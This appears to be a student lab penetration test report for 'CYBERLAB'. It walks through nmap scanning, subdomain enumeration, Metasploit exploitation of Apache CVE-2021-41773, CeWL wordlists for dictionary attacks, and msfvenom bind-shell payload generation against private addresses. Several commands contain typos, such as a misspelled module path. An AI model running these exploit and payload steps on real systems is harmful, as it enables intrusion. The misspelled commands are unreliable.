#  Internal Penetration Test

Submitted by: Israel Barnabas

## Internal Network Penetration Test  
**For**: CYBERLAB  
**Barnabas Security**  
**2024**

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Host Discovery](#Host Discovery)
3. [Service Discovery and Port Scanning](#Service Discovery and Port Scanning)
4. [Vulnerability Scanning](#Vulnerability Scanning)
5. [Web-based Attack surfaces](#Web-based Attack surfaces)
6. [CVSS v3.0 Reference Table](#cvss-v30-reference-table)

---

## Executive Summary
Barnabas Security performed an internal penetration test of in-scope items provided by CYBERLAB from September 13th, 2024, through September 15th, 2024. This report details the process find vulnerability with iin the system.



---
## Host Discovery
Host discovery is the process of identifying active devices (hosts) on a network.By identifying which hosts are live and reachable, you can determine the targets for further probing, such as port scanning and vulnerability analysis.

The internal network to be exploited are `10.10.10.0/24` and domain `https://virtualinfosecafrica.com`


A **ping scan** is executed to test the reachablility of hosts on the ip address i.e `ping 10.10.10.0/24` or `ping virtualinfosecafrica.com`.

Nmap is a tool which can be use for host discovery. Ther a a number of command that are used together in with nmap to yield the desired output such as

`-sL`: List Scan - simply list targets to scan

  `-sn`: Ping Scan - disable port scan eg(`nmap -sn 10.10.10.0/24`)

  `-Pn`: Treat all hosts as online -- skip host discovery

  Using the command `nmap -sL 10.10.10.0/24 > targetlist.txt`
 list all the ip address to be scanned. With a subnet mask of **24**, 256 address are to be produced.

 ![Screenshot_2024-09-15_06_23_33](https://github.com/user-attachments/assets/40a9554b-b69e-400e-9338-b51900369ed7)

 * After running the scan, it is assummed that 15 hosts are up then next step is to filter out of you list of ip address then saved in a file. 

 `$ nmap -sn -iL targetlist.txt | grep -i "nmap scan report" > onlinehost.txt`
 
 ![Screenshot_2024-09-15_21_26_19](https://github.com/user-attachments/assets/3f8036bb-01e0-4283-bc1b-21e01a78791f)

To obtain subdomain enumeration, the `aiodnsbrute`
 tool is used. From the results shown below, a number of subdomain were optained with theire respective ip address.

![Screenshot_2024-09-15_08_45_36](https://github.com/user-attachments/assets/4db48e08-70bc-497a-a0c4-048b045d9842)

---

## Service Discovery and Port Scanning

Service discovery and port scanning are essential steps in network security and penetration testing. They help to identify the services running on a network and the open ports that could potentially be exploited by attackers.

To do servive and port scan, the command `sV` is used. This command **-sV** probe open ports to determine service/version info.

![Screenshot_2024-09-15_09_31_08](https://github.com/user-attachments/assets/999c74c7-6a90-4ffe-a743-8c8f63845e01)

From the output obtained, the various ports and service versions associated with the open ports can be checked for any exploits. The service version `Apache httpd 2.4.49` has been found to have some vulnerabilities. It has a cve number **`2021-41773`**


---

## Vulnerability Scanning

A vulnerability scan is an automated process of identifying security weaknesses in a network, system, or application. It involves using specialized software tools  such as metasploit, nmap, theharvester and so to scan the target for known vulnerabilities, such as outdated software, misconfigurations, open ports, and security flaws. Vulnerability scans provide an essential step in securing systems by identifying and assessing potential points of exploitation that attackers could use to compromise the network.

Using  METASPLOIT for your vulnerability scan;

* First open metasploit with the command `msfconsole`
* When opened, input this command `search cve:2021-41773` (this is the cve for the service version stated above in our service scan)

![Screenshot_2024-09-15_17_35_25](https://github.com/user-attachments/assets/6f050e8d-6e2f-4964-a9eb-982d2b6ea8cd)

* Look for an appropriate module. If available, note the module's path such as `expliot/multi/http/apache_normaalize_path_rce`
* load expliot: `use expliot/multi/http/apache_normaalize_path_rce`
* Set the target host (RHOSTS=10.10.10.20) and target port (RPORT=80), among other options.
* Execute the Exploit: `run`

![Screenshot_2024-09-15_17_41_28](https://github.com/user-attachments/assets/0106cee0-7299-43eb-913d-7ba8f323edab)

To create a custom word,  `cewl` is used which is used to gather potential usernames, passwords, and other keywords for use in dictionary attacks or social engineering. By crawling through the specified website, CeWL collects words that might be relevant to the target organization, allowing attackers to create more targeted wordlists.

![Screenshot_2024-09-15_23_06_16](https://github.com/user-attachments/assets/299fcea1-6552-45c4-911c-0a8c4d9cbffb)

---

## Web-based Attack surfaces
Here potential entry points and vulnerabilities on a web application, website, or web server can exploit.
`eyewitness` is the main tool of focus for this stage.

![Screenshot_2024-09-15_19_07_16](https://github.com/user-attachments/assets/df2faeb0-d6f4-4629-b61c-e57ba8409a0e)

This command allows you to capture the web server.

![Screenshot_2024-09-15_19_12_48](https://github.com/user-attachments/assets/9b87f560-bd4c-4314-8cc7-4a5a25056c34)

file should include the non-standaised ports.

Generating Payloads with Msfvenom


Host 10.10.10.55 (Apache Tomcat)


To generate a payload that triggers a TCP bind shell on execution, use:

`msfvenom -p java/meterpreter/bind_tcp LHOST=10.10. 10.55 LPORT=4444 -f war -o shell_bind.war`

![Screenshot_2024-09-15_19_32_46](https://github.com/user-attachments/assets/a225d706-838e-4bfe-8334-fc1f9f499036)


To generate a base64-encoded payload that executes a TCP bind shell, use:


`msfvenom -p python/meterpreter/bind_tcp LHOST=10.10.10.30 LPORT=4444 -e base64`

![Screenshot_2024-09-15_19_37_55](https://github.com/user-attachments/assets/63ebe9cf-a5a6-4110-bbdb-dcc26553734a)








---



---
## CVSS v3.0 Reference Table
| Qualitative Rating | CVSS Score |
| ------------------ | ---------- |
| None/Informational | N/A        |
| Low                | 0.1 – 3.9  |
| Medium             | 4.0 – 6.9  |
| High               | 7.0 – 8.9  |
| Critical           | 9.0 – 10.0 |

---





